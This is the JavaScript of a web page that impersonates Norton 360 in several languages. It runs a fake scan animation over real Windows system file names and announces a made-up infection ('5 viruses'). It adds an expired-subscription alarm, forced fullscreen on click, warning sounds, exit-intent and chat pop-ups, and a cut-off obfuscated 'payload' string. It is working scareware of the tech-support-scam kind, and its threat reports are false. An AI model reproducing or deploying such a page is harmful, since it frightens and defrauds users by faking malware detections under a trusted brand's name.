        document.getElementById("w1_8").innerHTML = "| Scansione rapida";
        document.getElementById("w1_9").innerHTML = "Licenze utilizzate: ";
        document.getElementById("w1_10").innerHTML = "1 di 5";
        document.getElementById("w1_11").innerHTML = "| Installa su un altro dispositivo";
        document.getElementById("w1_12").innerHTML = "Sicurezza";
        document.getElementById("w1_13").innerHTML = "Protetto";
        document.getElementById("w1_14").innerHTML = "Identità";
        document.getElementById("w1_13a").innerHTML = "Protetto";
        document.getElementById("w1_15").innerHTML = "Prestazioni";
        document.getElementById("w1_13b").innerHTML = "Protetto";
        document.getElementById("w1_16").innerHTML = "Altro di Norton";
        document.getElementById("w1_13c").innerHTML = "Protetto";
        document.getElementById("w1_17").innerHTML = "STATO DELLA SOTTOSCRIZIONE: ";
        document.getElementById("w1_18").innerHTML = "30 giorni rimanenti";
        document.getElementById("w2_1").innerHTML = "Scansione rapida";
        document.getElementById("w2_2").innerHTML = "In esecuzione";
        document.getElementById("w2_3").innerHTML = "Scansione delle aree comunemente infette e dei file di avvio...";
        document.getElementById("w2_4").innerHTML = "In esecuzione";
        document.getElementById("w2_5").innerHTML = "Scansione delle aree comunemente infette e dei file di avvio...";
        document.getElementById("w2_6").innerHTML = "Riepilogo risultati:";
        document.getElementById("w2_7").innerHTML = "[+] Totale elementi scansionati:";
        document.getElementById("w2_8").innerHTML = "[+] Totale minacce per la sicurezza rilevate:";
        document.getElementById("w2_9").innerHTML = "[+] Totale minacce per la sicurezza risolte:";
        document.getElementById("w2_10").innerHTML = "Totale minacce per la sicurezza che richiedono interventi:";
        document.getElementById("w2_11").innerHTML = "Pausa";
        document.getElementById("w2_12").innerHTML = "Interrompi";
        document.getElementById("w3_1").innerHTML = "Il PC contiene 5 virus!";
        document.getElementById("w3_2").innerHTML = "INTERVENTO NECESSARIO!";
        document.getElementById("w3_3").innerHTML = "La tua sottoscrizione a Norton è scaduta!";
        document.getElementById("w3_4").innerHTML = "Rinnovala ora per mantenere il PC al sicuro.";
        document.getElementById("w3_5").innerHTML = "Un PC non protetto è esposto al rischio di virus e altri malware.";
        document.getElementById("w3_6").innerHTML = "Continua...";
        document.getElementById("w4_1").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_1a").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_1b").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_1c").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_1d").innerHTML = "Minaccia rilevata!";
        document.getElementById("w4_2").innerHTML = "Rischio elevato";
        document.getElementById("w4_2a").innerHTML = "Rischio elevato";
        document.getElementById("w4_2b").innerHTML = "Rischio elevato";
        document.getElementById("w4_2c").innerHTML = "Rischio elevato";
        document.getElementById("w4_3").innerHTML = "Rischio medio";
        document.getElementById("w4_4").innerHTML = "Origine";
        document.getElementById("w4_4a").innerHTML = "Origine";
        document.getElementById("w4_4b").innerHTML = "Origine";
        document.getElementById("w4_4c").innerHTML = "Origine";
        document.getElementById("w4_4d").innerHTML = "Origine";
        document.getElementById("w4_5").innerHTML = "Non disponibile";
        document.getElementById("w4_5a").innerHTML = "Non disponibile";
        document.getElementById("w4_5b").innerHTML = "Non disponibile";
        document.getElementById("w4_5c").innerHTML = "Non disponibile";
        document.getElementById("w4_5d").innerHTML = "Non disponibile";
        document.getElementById("w4_6").innerHTML = "Attività";
        document.getElementById("w4_6a").innerHTML = "Attività";
        document.getElementById("w4_6b").innerHTML = "Attività";
        document.getElementById("w4_6c").innerHTML = "Attività";
        document.getElementById("w4_6d").innerHTML = "Attività";
        document.getElementById("w4_7").innerHTML = "Correzioni delle minacce eseguite: 1";
        document.getElementById("w4_7a").innerHTML = "Correzioni delle minacce eseguite: 1";
        document.getElementById("w4_7b").innerHTML = "Correzioni delle minacce eseguite: 1";
        document.getElementById("w4_7c").innerHTML = "Correzioni delle minacce eseguite: 1";
        document.getElementById("w4_7d").innerHTML = "Correzioni delle minacce eseguite: 1";
    }

    if (lang == "el") {
        document.getElementById("menu").innerHTML = "ΠΡΟΪΟΝΤΑ ΚΑΙ ΥΠΗΡΕΣΙΕΣ &nbsp&nbsp&nbsp ΥΠΟΣΤΗΡΙΞΗ &nbsp&nbsp&nbsp ΔΩΡΕΑΝ ΔΟΚΙΜΑΣΤΙΚΕΣ ΕΚΔΟΣΕΙΣ";
        document.getElementById("menu_b").innerHTML = "Νομική σημείωση | Άδεια χρήσης | Πολιτική προστασίας προσωπικών δεδομένων | Ευκαιρίες καριέρας | Cookie | Χάρτης τοποθεσίας | Κατάσταση συστήματος";
        document.getElementById("head1").innerHTML = "Οι απειλές του κυβερνοχώρου έχουν εξελιχθεί. Το ίδιο συμβαίνει και με την προστασία μας.";
        document.getElementById("head2").innerHTML =
            "Norton 360. Ολοκληρωμένη προστασία με ασφάλεια συσκευής που περιλαμβάνει λογισμικό προστασίας από ιούς, VPN, ένα πρόγραμμα διαχείρισης κωδικών πρόσβασης και πολλά άλλα. Όλα σε μία μόνο λύση.";
    }

    if (lang == "pt") {
        document.getElementById("menu").innerHTML = "PRODUTOS E SERVIÇOS &nbsp&nbsp&nbsp SUPORTE &nbsp&nbsp&nbsp AVALIAÇÕES GRATUITAS";
        document.getElementById("menu_b").innerHTML = "Aviso Legal | Contrato de Licença | Política de Privacidade | Carreiras | Cookies | Mapa do Site | Estado do Sistema";
        document.getElementById("head1").innerHTML = "As ciberameaças evoluíram. A nossa proteção também.";
        document.getElementById("head2").innerHTML = "Norton 360. Proteção abrangente com segurança do dispositivo, incluindo antivírus, além de uma VPN, um gestor de palavras-passe e muito mais. Tudo numa única solução.";
        document.getElementById("w1_ico1").style.right = "165px";
        document.getElementById("w1_1").style.right = "85px";
        document.getElementById("w1_ico2").style.right = "55px";
        document.getElementById("w1_1").innerHTML = "Configurações";
        document.getElementById("w1_2").innerHTML = "Ajuda";
        document.getElementById("w1_3").innerHTML = "Você está protegido";
        document.getElementById("w1_4").innerHTML = "Atualizações de segurança: ";
        document.getElementById("w1_5").innerHTML = "Atual";
        document.getElementById("w1_6").innerHTML = "Última verificação: ";
        document.getElementById("w1_7").innerHTML = "Não disponível";
        document.getElementById("w1_8").innerHTML = "| Verificação rápida";
        document.getElementById("w1_9").innerHTML = "Licenças usadas: ";
        document.getElementById("w1_10").innerHTML = "1 de 5";
        document.getElementById("w1_11").innerHTML = "| Instalar em outro dispositivo";
        document.getElementById("w1_12").innerHTML = "Segurança";
        document.getElementById("w1_13").innerHTML = "Protegido";
        document.getElementById("w1_14").innerHTML = "Identidade";
        document.getElementById("w1_13a").innerHTML = "Protegido";
        document.getElementById("w1_15").innerHTML = "Performance";
        document.getElementById("w1_13b").innerHTML = "Protegido";
        document.getElementById("w1_16").innerHTML = "Mais Norton";
        document.getElementById("w1_13c").innerHTML = "Protegido";
        document.getElementById("w1_17").innerHTML = "STATUS DA ASSINATURA: ";
        document.getElementById("w1_18").innerHTML = "Faltam 30 dias";
        document.getElementById("w2_1").innerHTML = "Verificação rápida";
        document.getElementById("w2_2").innerHTML = "Trabalhando";
        document.getElementById("w2_3").innerHTML = "Verificando áreas frequentemente infectadas e arquivos de inicialização...";
        document.getElementById("w2_4").innerHTML = "Trabalhando";
        document.getElementById("w2_5").innerHTML = "Verificando áreas frequentemente infectadas e arquivos de inicialização...";
        document.getElementById("w2_6").innerHTML = "Resumo dos resultados";
        document.getElementById("w2_7").innerHTML = "[+] Total de itens verificados:";
        document.getElementById("w2_8").innerHTML = "[+] Total de riscos de segurança detectados:";
        document.getElementById("w2_9").innerHTML = "[+] Total de riscos de segurança resolvidos:";
        document.getElementById("w2_10").innerHTML = "Total de riscos de segurança que requerem atenção:";
        document.getElementById("w2_11").innerHTML = "Pausar";
        document.getElementById("w2_12").innerHTML = "Parar";
        document.getElementById("w3_1").innerHTML = "Seu PC está infectado com 5 vírus!";
        document.getElementById("w3_2").innerHTML = "AÇÃO NECESSÁRIA!";
        document.getElementById("w3_3").innerHTML = "Sua assinatura do Norton expirou!";
        document.getElementById("w3_4").innerHTML = "Renove agora para manter seu PC protegido!";
        document.getElementById("w3_5").innerHTML = "Se o seu PC estiver desprotegido, ele corre risco de pegar vírus e outros malwares.";
        document.getElementById("w3_6").innerHTML = "Continuar...";
        document.getElementById("w4_1").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_1a").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_1b").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_1c").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_1d").innerHTML = "Ameaça detectada!";
        document.getElementById("w4_2").innerHTML = "Alto risco";
        document.getElementById("w4_2a").innerHTML = "Alto risco";
        document.getElementById("w4_2b").innerHTML = "Alto risco";
        document.getElementById("w4_2c").innerHTML = "Alto risco";
        document.getElementById("w4_3").innerHTML = "Risco médio";
        document.getElementById("w4_4").innerHTML = "Origem";
        document.getElementById("w4_4a").innerHTML = "Origem";
        document.getElementById("w4_4b").innerHTML = "Origem";
        document.getElementById("w4_4c").innerHTML = "Origem";
        document.getElementById("w4_4d").innerHTML = "Origem";
        document.getElementById("w4_5").innerHTML = "Não disponível";
        document.getElementById("w4_5a").innerHTML = "Não disponível";
        document.getElementById("w4_5b").innerHTML = "Não disponível";
        document.getElementById("w4_5c").innerHTML = "Não disponível";
        document.getElementById("w4_5d").innerHTML = "Não disponível";
        document.getElementById("w4_6").innerHTML = "Atividade";
        document.getElementById("w4_6a").innerHTML = "Atividade";
        document.getElementById("w4_6b").innerHTML = "Atividade";
        document.getElementById("w4_6c").innerHTML = "Atividade";
        document.getElementById("w4_6d").innerHTML = "Atividade";
        document.getElementById("w4_7").innerHTML = "Ações realizadas contra ameaças: 1";
        document.getElementById("w4_7a").innerHTML = "Ações realizadas contra ameaças: 1";
        document.getElementById("w4_7b").innerHTML = "Ações realizadas contra ameaças: 1";
        document.getElementById("w4_7c").innerHTML = "Ações realizadas contra ameaças: 1";
        document.getElementById("w4_7d").innerHTML = "Ações realizadas contra ameaças: 1";
    }

    if (lang == "pl") {
        document.getElementById("menu").innerHTML = "PRODUKTY I USŁUGI &nbsp&nbsp&nbsp POMOC &nbsp&nbsp&nbsp BEZPŁATNE WERSJE PRÓBNE";
        document.getElementById("menu_b").innerHTML = "Informacje prawne | Umowa licencyjna | Zasady ochrony danych osobowych | Praca | Pliki cookie | Mapa witryny | Stan systemu";
        document.getElementById("head1").innerHTML = "Zagrożenia sieciowe ewoluowały. Nasza ochrona również.";
        document.getElementById("head2").innerHTML = "Norton 360. Kompleksowa ochrona urządzeń, w tym antywirus, sieć VPN, menedżer haseł i nie tylko. Zintegrowane rozwiązanie.";
    }

    if (lang == "nl") {
        document.getElementById("menu").innerHTML = "PRODUCTEN EN SERVICES &nbsp&nbsp&nbsp ONDERSTEUNING &nbsp&nbsp&nbsp GRATIS PROEFVERSIES";
        document.getElementById("menu_b").innerHTML = "Juridische informatie | Licentieovereenkomst | Privacybeleid | Cookies | Site-index | RSS | Systeemstatus";
        document.getElementById("head1").innerHTML = "Cyberbedreigingen zijn geëvolueerd. En daarmee ook onze bescherming.";
        document.getElementById("head2").innerHTML = "NIEUWE Norton 360. Uitgebreide bescherming met apparaatbeveiliging waaronder antivirus, een VPN, wachtwoordbeheer en meer. Allemaal in één oplossing.";
    }

    if (lang == "sv") {
        document.getElementById("menu").innerHTML = "PRODUKTER OCH TJÄNSTER &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp PROVA UTAN KOSTNAD";
        document.getElementById("menu_b").innerHTML = "Juridiskt meddelande | Licensavtal | Sekretesspolicy | Lediga tjänster | Cookies | Webbplatsöversikt | Systemstatus";
        document.getElementById("head1").innerHTML = "Hot på internet har utvecklats. Det har vårt skydd också.";
        document.getElementById("head2").innerHTML = "Norton 360. Omfattande skydd med säkerhet för digitala enheter inklusive antivirus, plus VPN, en lösenordshanterare med mera. Allt i en enda lösning.";
    }

    if (lang == "tr") {
        document.getElementById("menu").innerHTML = "ÜRÜNLER VE HİZMETLER &nbsp&nbsp&nbsp DESTEK &nbsp&nbsp&nbsp ÜCRETSİZ DENEME";
        document.getElementById("menu_b").innerHTML = "Yasal Bildirim | Lisans Sözleşmesi | Gizlilik İlkesi | Kariyer | Tanımlama Bilgileri | Site Haritası | Sistem Durumu";
        document.getElementById("head1").innerHTML = "Siber tehditler gelişti. Koruma çözümlerimiz de öyle.";
        document.getElementById("head2").innerHTML = "Norton 360. Antivirüs, parola yöneticisi, PC Cloud Backup‡‡, 4 ve daha fazlasını içeren cihaz güvenliği ile kapsamlı koruma. Hepsi tek bir çözümde.";
    }
    if (lang == "ja") {
        document.getElementById("menu").innerHTML = "製品とサービス &nbsp&nbsp&nbsp ノートン ブログ &nbsp&nbsp&nbsp サポート &nbsp&nbsp&nbsp 無料体験版";
        document.getElementById("menu_b").innerHTML = "日本 | 利用規約 | 使用許諾契約 | プライバシーポリシー | 採用情報 | クッキー | サイトマップ | システムの状態";
        document.getElementById("head1").innerHTML = "進化するサイバー脅威。ノートン製品も進化。";
        document.getElementById("head2").innerHTML =
            "ノートン 360 がリリースされました。ウイルス対策機能、VPN、パスワード管理機能など、包括的な保護機能によってデバイスセキュリティを確保することができます。すべての機能が 1 つのソリューションに導入されています。";
    }
    if (lang == "ru") {
        document.getElementById("menu").innerHTML = "ПРОДУКТЫ И УСЛУГИ &nbsp&nbsp&nbsp ПОДДЕРЖКА &nbsp&nbsp&nbsp БЕСПЛАТНЫЕ ПРОБНЫЕ ВЕРСИИ";
        document.getElementById("menu_b").innerHTML = "Юридическая информация | Лицензионное соглашение | Политика конфиденциальности | Вакансии | Файлы cookie | Карта сайта | Состояние системы";
        document.getElementById("head1").innerHTML = "Киберугрозы развиваются. Наша защита тоже.";
        document.getElementById("head2").innerHTML =
            "Norton 360. Комплексная защита устройств, в которую входят антивирусные программы, Password Manager, резервное копирование в облаке для ПК‡‡, 4 и многое другое. Все в одном решении.";
    }
</script>
<script language="JavaScript" type="text/javascript">
    setTimeout(function () {
        document.getElementById("win2").style.display = "block";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "143";
    }, 100);
    setTimeout(function () {
        document.getElementById("path1").innerHTML = "C:\Windows\System32\csrss.exe";
    }, 100);
    setTimeout(function () {
        document.getElementById("path1").innerHTML = "C:\Windows\System32\sihost.exe";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "218";
    }, 100);
    setTimeout(function () {
        document.getElementById("path1").innerHTML = "C:\Program Files\Windows Defender\MSASCuiL.exe";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "398";
        document.getElementById("cnt2").style.color = "#dd0000";
        document.getElementById("cnt2").innerHTML = "1";
        document.getElementById("cnt4").style.color = "#dd0000";
        document.getElementById("cnt4").innerHTML = "1";
        document.getElementById("win2_line_red").style.display = "block";
        document.getElementById("beep").play();
    }, 100);
    setTimeout(function () {
        document.getElementById("vir1").style.bottom = "235px";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\SgrmBroker.exe";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "SEMgrSvc";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "538";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "NcaSvc";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "791";
        document.getElementById("cnt2").innerHTML = "2";
        document.getElementById("cnt4").innerHTML = "2";
    }, 100);
    setTimeout(function () {
        document.getElementById("vir1").style.bottom = "440px";
        document.getElementById("vir1").style.opacity = "0";
        document.getElementById("vir2").style.bottom = "235px";
        document.getElementById("beep").play();
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\DDFs";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1021";
        document.getElementById("cnt2").innerHTML = "3";
        document.getElementById("cnt4").innerHTML = "3";
    }, 100);
    setTimeout(function () {
        document.getElementById("vir2").style.bottom = "440px";
        document.getElementById("vir2").style.opacity = "0";
        document.getElementById("vir3").style.bottom = "235px";
        document.getElementById("beep").play();
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\Recovery";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1273";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\DriverState";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "tempRoot\system32\DRIVERS\bowser.sys";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1589";
        document.getElementById("cnt2").innerHTML = "4";
        document.getElementById("cnt4").innerHTML = "4";
    }, 100);
    setTimeout(function () {
        document.getElementById("vir3").style.bottom = "440px";
        document.getElementById("vir3").style.opacity = "0";
        document.getElementById("vir4").style.bottom = "235px";
        document.getElementById("beep").play();
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\WinBioDatabase";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1723";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "vmickvpexchange";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "1916";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "HidBtn";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "2038";
        document.getElementById("cnt2").innerHTML = "80";
        document.getElementById("cnt4").innerHTML = "80";
    }, 100);
    setTimeout(function () {
        document.getElementById("vir4").style.bottom = "440px";
        document.getElementById("vir4").style.opacity = "0";
        document.getElementById("vir5").style.bottom = "235px";
        document.getElementById("beep").play();
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "WdNisDrv";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "rdbss";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "C:\Windows\System32\dot3svc.dll";
    }, 100);
    setTimeout(function () {
        document.getElementById("path2").innerHTML = "UASPStor";
    }, 100);
    setTimeout(function () {
        document.getElementById("cnt1").innerHTML = "2038";
        document.getElementById("vir5").style.opacity = "0";
        document.getElementById("w2_4").innerHTML = "Done";
        if (lang == "pt") document.getElementById("w2_4").innerHTML = "Terminado";
        if (lang == "es") document.getElementById("w2_4").innerHTML = "Listo";
        if (lang == "fr") document.getElementById("w2_4").innerHTML = "Effectué";
        if (lang == "it") document.getElementById("w2_4").innerHTML = "Fatto";
        document.getElementById("w2_5").innerHTML = "";
        document.getElementById("path2").innerHTML = "";
        document.getElementById("win3").style.display = "none";
        document.getElementById("link_black").href = "#";
    }, 100);

    function showmess() {
        document.getElementById("mess").style.display = "block";
    }
</script>
<script type="text/javascript">
    /*$(document).ready(function(){
  $("#open_popup").click(function(){
$(".chrome-alert").show();
});
});*/
</script>
<script type="text/javascript">
    addEventListener("click", function () {
        var
            el = document.documentElement
            , rfs =
            el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen
        ;
        rfs.call(el);
    });
</script>
<script type="text/javascript">
    setTimeout(function () {
        document.getElementById("map").style.display = "block";
        document.getElementById("warning").play();
    }, 10);
</script>
<script type="text/javascript">
    /*=============HELPER================*/
    var Helper = (function () {

        var data = [];

        var months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
        var days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];

        function setDays(d) {
            if ((d.constructor !== Array) || d.length !== 7)
                return false;

            days = d;
        }

        function setMonths(m) {
            if ((m.constructor !== Array) || m.length !== 12)
                return false;

            months = m;
        }

        function getDate() {
            var now = new Date();
            var month = typeof (months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
            return (now.getDate()) + " " + month + " " + now.getFullYear();
        }

        function getMonth() {
            var now = new Date();
            var month = typeof (months[now.getMonth()]) == 'undefined' ? now.getMonth() : months[now.getMonth()];
            return month;
        }

        function getDay() {
            var now = new Date();
            var day = typeof (days[now.getDay()]) == 'undefined' ? now.getDay() : days[now.getDay()];
            return day;
        }

        function getDayOfMonth() {
            var now = new Date();
            var day = ('0' + now.getDate()).slice(-2);
            return day;
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        function findAncestor(element, name) {
            while ((element = element.parentElement) && !element.classList.contains(name)) ;
            return element;
        }

        function bindOnQuery(query, callback, action = 'click') {
            var elements = document.querySelectorAll(query);
            for (var i = 0; i < elements.length; i++) {
                elements[i].addEventListener(action, callback, false);
            }
        }

        function bindOnId(name, callback, action = 'click') {
            var element = document.getElementById(name);
            element.addEventListener(action, callback, false);
        }

        function replaceMarkers(text, markers) {
            for (key in markers) {
                var search = '%' + key + '%';
                text = text.replace(new RegExp(search, 'g'), markers[key]);
            }

            return text;
        }

        return {
            setDays: setDays,
            setMonths: setMonths,
            getDate: getDate,
            getDay: getDay,
            getMonth: getMonth,
            getDayOfMonth: getDayOfMonth,
            getUrlParameter: getUrlParameter,
            findAncestor: findAncestor,
            bindOnQuery: bindOnQuery,
            bindOnId: bindOnId,
            replaceMarkers: replaceMarkers
        };

    })();
</script>


<script type="text/javascript">
    setTimeout(function () {
        document.getElementById("map").style.display = "block";
        document.getElementById("warning").play();
    }, 10);

</script>


<script>

    $(document).ready(function () {
        $(".arow-div").delay(1000).fadeIn(500);
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".delayedPopupWindow").click(function () {
            $('.delayedPopupWindow').hide('fast');
        });
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".black").click(function () {
            $('.delayedPopupWindow').hide('fast');
        });
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $("#win1").click(function () {
            $('.delayedPopupWindow').hide('fast');
        });
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $("#win2").click(function () {
            $('.delayedPopupWindow').hide('fast');
        });
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $("alert_popup").click(function () {
            $('.delayedPopupWindow').hide('fast');
        });
    });
</script>

<script type="text/javascript">
    function addEvent(obj, evt, fn) {
        if (obj.addEventListener) {
            obj.addEventListener(evt, fn, false);
        } else if (obj.attachEvent) {
            obj.attachEvent("on" + evt, fn);
        }
    }

    addEvent(document, 'mouseout', function (evt) {
        if (evt.toElement == null && evt.relatedTarget == null) {
            $('.lightbox').slideDown();
        }
        ;
    });

    $('a.close').click(function () {
        $('.lightbox').slideUp();
    });


</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".delayedPopupWindow").delay(100).fadeIn(100);
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".alert_popup").delay(100).fadeIn(100);
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $("#chat-box").delay(100).fadeIn(100);
    });

</script>

<script src="jsfjquery.js" type="text/javascript"></script>

<script>



const payload = decodeURIComponent('T%CD%90%CC%89%CC%92%CC%92%CD%83%CC%92%CD%AA%CD%AB%CD%82%CC%83%CC%8B%CD%8B%CD%AB%CD%82%CD%84%CD%AA%CC%90%CD%A5%CC%95%CD%98%CC%99%CD%94%CC%A4%CC%B9%CC%AF%CC%97%CC%BB%CC%98%CD%93%CC%A4%CC%AF%CD%8D%CC%A9%CC%BCo%CC%83%CD%82%CC%8B%CC%84%CC%BE%CD%AA%CD%90%CD%9B%CC%80%CC%81%CC%8F%CC%91%CD%A8%CD%A4%CD%90%CD%A3%CD%97%CD%A9%CC%92%CC%B7%CD%8F%CC%AE%CD%9A%CD%8D%CD%94%CD%85%CC%AA%CD%99%CD%99%CC%AF%CD%8D%CC%B1%CD%88%CD%94%CC%98%CD%96%CD%8E%CC%B9%20%CD%8A%CD%84%CC%88%CC%94%CD%82%CD%82%CD%A6%CC%84%CC%BF%CC%8E%CC%9A%CD%82%CC%80%CD%AE%CC%8F%CC%A1%CC%B4%CD%A1%CC%BB%CC%98%CC%A4i%CD%AD%CD%8C%CC%84%CC%8C%CD%A9%CD%8B%CD%AD%CD%84%CC%BF%CC%83%CC%BD%CC%8D%CC%85%CD%AA%CD%A8%CD%8B%CC%84%CC%8B%CD%A2%CD%9F%CC%A2%CD%81%CC%9C%CC%A0%CC%A9%CD%8E%CC%BB%CC%9D%CD%85%CC%9C%CC%98%CC%B0%CD%9A%CC%A6%CC%B9%CC%98%CC%B3%CC%AD%CC%B0%CC%ABn%CC%80%CC%94%CC%91%CD%90%CD%A9%CD%9B%CD%82%CC%94%CC%8A%CD%A6%CC%82%CC%8A%CD%A9%CC%80%CD%9F%CC%A7%CC%B7%D2%89%CD%8D%CC%A9%CD%8E%CC%AB%CC%B3%CC%AB%CC%9E%CC%AC%CC%9E%CC%A9%CC%A5%CD%89%CC%AF%CC%9C%CD%8E%CD%89%CC%A4%CC%A9v%CD%A7%CD%AE%CC%8D%CC%8C%CC%83%CD%A6%CC%BF%CD%A6%CC%8D%CD%A8%CC%94%CD%84%CD%AD%CD%9B%CC%8F%CC%B7%CC%B6%CD%8F%CD%9F%CD%98%CC%AA%CC%9D%CC%A5%CD%93%CC%B9%CC%96%CC%AC%CC%AF%CC%AA%CD%93%CC%98%CC%96o%CD%90%CD%AA%CD%91%CD%AC%CD%83%CC%92%CD%9B%CC%BD%CD%A4%CC%82%CD%A9%CD%80%CC%B9%CC%A6%CC%A0%CC%A6%CC%AE%CD%94%CC%BC%CC%AC%CC%BB%CC%A6%CC%99%CC%A4%CC%AA%CC%BAk%CC%86%CD%A4%CC%8C%CD%8B%CC%85%CD%AF%CD%8C%CC%9A%CC%89%CC%80%CD%97%CD%90%CC%88%CC%81%CC%8A%CD%A3%CC%85%CD%A2%CD%98%CD%8F%CD%80%CC%B9%CD%95%CC%9D%CD%99%CC%AB%CC%98%CC%A6%CC%BB%CC%9D%CD%93%CC%9F%CC%9F%CD%8E%CC%AD%CC%AC%CC%BB%CD%99%CD%89%CD%8De%CD%9B%CC%87%CD%86%CD%8C%CC%8A%CD%97%CC%8A%CC%82%CC%92%CC%91%CD%AA%CC%9A%CC%82%CD%A6%CC%93%CC%87%CD%80%CC%A8%CD%98%CC%B8%CC%96%CC%B3%CD%99%CC%AA%CC%A9%CC%98%CD%85%CC%B3%CD%96%CC%AF%20%CC%94%CC%84%CD%AE%CC%83%CC%8B%CC%90%CC%88%CD%82%CD%81%CD%98%CC%9B%D2%89%CC%B6%CC%A3%CD%99%CC%9C%CD%96%CC%A9%CC%98%CD%8D%CD%88%CC%BC%CC%AB%CD%89%CC%B1%CD%89%CC%AE%CC%9C%CD%87%CC%AC%CC%BAt%CD%82%CD%90%CD%92%CC%8A%CC%8C%CD%84%CC%BF%CD%A2%CC%B5%CD%94%CD%88%CC%AB%CD%9A%CD%88%CC%A0%CD%8E%CC%AB%CC%A0%CC%99%CC%A5%CC%B2%CC%A6%CC%AF%CC%B2%CD%94%CC%B9%CD%95h%CD%A7%CC%94%CC%9A%CD%8C%CD%A7%CC%BF%CC%91%CD%A1%CC%B5%CC%B2%CD%95%CD%89%CC%AB%CC%B3%CD%8D%CD%88%CC%A4%CC%AB%CC%A0%CC%A9%CC%9C%CC%AE%CD%85%CD%95%CC%96e%CC%84%CD%8B%CD%A6%CD%A3%CC%9B%CC%A8%CD%9D%CD%9C%CC%A8%CC%B0%CC%99%CC%BA%CD%87%CD%8E%CC%A4%20%CC%89%CC%BF%CD%AA%CD%A6%CC%81%CD%9B%CC%81%CD%83%CC%90%CC%8E%CC%9A%CD%9C%CD%9F%CC%97%CC%98%CC%99%CC%9F%CC%AC%CC%B2%CD%8D%CC%A3%CC%AB%CD%87%CC%9D%CD%87%CC%99h%CC%8F%CC%8B%CC%8A%CD%8B%CD%84%CD%8B%CC%BF%CD%9D%CC%98%CC%98%CC%98%CC%AC%CC%A9%CC%A6%CD%8D%CC%B3%CD%9Ai%CC%85%CD%8C%CD%90%CC%95%CD%9D%CC%A2%CD%96%CC%BC%CC%AF%CD%9A%CC%AE%CC%97%CD%95%CD%96v%CD%82%CC%8C%CD%A5%CC%89%CD%86%CD%A9%CD%91%CC%90%CD%A8%CD%A0%CC%B7%CD%8F%D2%89%CC%9E%CD%93%CC%AC%CD%94%CD%96%CC%A4e%CC%81%CC%88%CC%93%CC%92%CC%89%CC%87%CD%A8%CD%A8%CC%BF%CD%83%CC%85%CC%BE%CD%9B%CC%80%CD%82%CC%91%CC%85%CC%87%CC%B4%D2%89%CD%81%CC%AF%CD%94%CC%99%CD%94-%CC%85%CD%AA%CC%8C%CD%83%CD%AD%CD%9B%CD%AB%CD%80%CD%A2%CD%98%CC%B9%CD%88%CC%AB%CC%B2%CC%98%CC%9Fm%CC%8F%CC%9A%CC%8F%CC%82%CD%84%CC%83%CC%8E%CD%86%CC%94%CD%91%CC%82%CD%91%CC%BF%CD%97%CD%AC%CD%AA%CC%BD%CC%92%CC%BE%CC%B8%CC%A8%CD%80%CC%B0%CC%9F%CC%9C%CC%A5%CC%96%CC%B0%CC%9C%CC%9E%CD%89%CD%96%CC%AEi%CD%8C%CC%87%CC%86%CD%A6%CC%89%CD%A5%CD%AC%CD%83%CD%AC%CC%8C%CD%AC%CD%82%CC%87%CD%A6%CD%8C%CD%9F%CC%9B%CC%A5%CC%B2%CC%BB%CC%9F%CC%AB%CD%88%CC%A0%CC%A6%CD%85%CC%9E%CD%96%CC%A4n%CD%86%CC%8D%CC%9A%CC%88%CD%90%CC%BF%